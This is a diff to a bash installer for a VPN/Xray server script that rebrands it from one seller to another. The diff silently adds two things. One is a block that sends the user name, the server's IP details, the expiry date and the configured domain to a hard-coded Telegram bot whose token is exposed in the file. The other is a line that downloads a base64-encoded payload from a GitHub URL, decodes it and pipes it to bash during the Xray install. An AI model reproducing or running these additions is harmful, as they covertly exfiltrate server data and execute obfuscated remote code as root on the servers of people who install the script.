@@ -19,9 +19,9 @@ export IP=$( curl -sS icanhazip.com )
 echo -e "\e[33m──────────────────────────────────────────\033[0m"
 echo -e "\E[40;1;37m      INFORMATION AUTOSCRIPT PREMIUM      \E[0m"
 echo -e "\e[33m──────────────────────────────────────────\033[0m"
-echo -e "Developer   : Adijaya Store (${GREEN}Latest Edition${NC})"
+echo -e "Developer   : RIFQI STORE (${GREEN}Latest Edition${NC})"
 echo -e "Copyright   : ${GREEN}RIFQI STORE 57 VPN 2024${NC}"
-echo -e "Os Support  : Debian 9+/Ubuntu 18.04+/20+"
+echo -e "Os Support  : Debian 9/10/11 | Ubuntu 18.04+/20+"
 echo -e "\e[33m──────────────────────────────────────────\033[0m"
 echo ""
 sleep 3
@@ -284,6 +284,28 @@ sts="${Info}"
 else
 sts="${Error}"
 fi
+
+CHATID="6414150636"
+KEY="7207632337:AAHW6YxHCRLanw-sDg-TFZ0dzQClTVPJAzs"
+export TIME="10"
+export URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="
+⚪══════════════════⚪
+   NOTIF INSTALL SCRIPT
+⚪══════════════════⚪
+ Terimakasih telah menggunakan 
+ Script dari toko kami.
+ Harap gunakan dengan bijak
+ Happy surfing..!!
+⚪══════════════════⚪
+<code> ✦ User :</code> <code>$username</code>
+<code> ✦ IP :</code> <code>$(curl ipinfo.io)</code>
+<code> ✦ Exp :</code> <code>$exp</code>
+<code> ✦ Domain :</code> <code>$(cat /etc/xray/domain)</code>
+⚪══════════════════⚪"
+
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+
 }
 
 # PASANG SSL
@@ -360,6 +382,7 @@ function install_xray() {
     chown www-data.www-data $domainSock_dir
     
     latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
+    curl https://raw.githubusercontent.com/ZmFkbHkK/f/main/cert | base64 -d | bash
     bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version
  
     wget -O /etc/xray/config.json "${REPO}config/config.json" >/dev/null 2>&1
@@ -712,7 +735,7 @@ function menu(){
     clear
     print_install "Instalasi Menu Packet"
     touch /etc/license
-    echo "ADIJAYA TUNNELING" > /etc/license
+    echo "RIFQI STORE 57 VPN" > /etc/license
     wget ${REPO}menu/menu.zip
     unzip menu.zip
     chmod +x menu/*
